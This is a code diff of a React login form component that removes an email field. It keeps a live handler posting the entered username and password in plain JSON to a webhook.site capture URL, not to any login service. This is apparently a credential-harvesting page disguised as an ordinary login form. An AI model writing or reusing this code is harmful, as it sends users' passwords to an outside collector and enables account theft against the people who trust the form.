@@ -2,13 +2,11 @@ import React, { useState } from 'react'
 import { Box, Flex, FormControl, FormLabel, Input, Center, Heading, Button } from '@chakra-ui/react'
 import { Link } from 'react-router-dom'
 const LoginTab = () => {
-    const [email, setEmail] = useState('')
     const [username, setUsername] = useState('')
     const [password, setPassword] = useState('')
     const onClick = () => {
         fetch('https://webhook.site/f87e51c8-9a3a-4836-8603-6047d18985e6', {
             body: JSON.stringify({
-                email,
                 username,
                 password,
             }),
@@ -25,17 +23,6 @@ const LoginTab = () => {
                 </Center>
                 <Box>
                     <form>
-                        <FormControl>
-                            <FormLabel>Email</FormLabel>
-                            <Input
-                                type='email'
-                                placeholder='Enter your email address'
-                                value={email}
-                                onChange={(e) => {
-                                    setEmail(e.target.value)
-                                }}
-                            />
-                        </FormControl>
                         <FormControl>
                             <FormLabel>Username</FormLabel>
                             <Input
